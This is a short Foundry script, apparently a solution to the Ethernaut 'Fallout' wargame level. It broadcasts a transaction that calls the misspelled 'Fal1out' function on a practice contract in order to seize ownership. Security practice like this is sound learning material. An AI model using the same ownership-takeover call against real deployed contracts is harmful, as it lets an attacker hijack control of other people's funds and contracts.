// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/02/Fallout.sol";

contract Exploit is Script {

      //////////////////////////////////////////
      // CHANGE: add the current instance address
      /////////////////////////////////////////
    
      address level_instance = 0xAADB92d23788EA81c46fe22C4d4771B23dcc96a2;
      Fallout level = Fallout(payable(address(level_instance)));

      function run() public {

          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

          level.Fal1out();

          vm.stopBroadcast();
    }
}